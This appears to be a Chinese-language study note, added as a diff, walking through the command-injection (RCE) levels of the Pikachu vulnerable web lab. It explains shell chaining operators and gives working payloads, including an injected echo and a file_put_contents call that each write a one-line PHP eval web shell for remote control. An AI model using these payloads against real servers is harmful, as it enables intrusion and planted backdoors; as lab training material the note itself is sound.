@@ -1,0 +1,15 @@
+### 实操-Pikachu-RCE（全关）
+#第一关 "ping"
+1. &：后台并行执行 ping 127.0.0.1 & whoami先后台执行ping，然后立刻执行whoami
+2. &&：前面命令执行成功，后面才执行  cd /tmp && ls 如果进入/tmp成功，则列出目录
+3. ;：不管前面是否执行成功，后面也执行 pwd ; ls ; whoami 依次执行三条命令
+4. |：前输出当后输入    cat /etc/password | grep root先读取文件，再筛选包含root的行
+5. ||：前面命令失败才执行后面命令 cat /test.txt || echo"文件不存在" 文件不存在则输出提示
+
+127.0.0.1 & echo ^<?php @eval($_POST['1']);?^> >2.php   这里^为windows转义符，
+紧贴的下一个字符当做普通文本，echo输出重定向到文件2.php可以创建文件连接蚁剑。
+
+#第二关 "eval"
+1. echo PHP_OS;     查看系统
+2. system(whoami);  当前命令用户名
+3. file_put_contents('2.php', '<?php @eval($_POST["1"]);?>');   植入后门
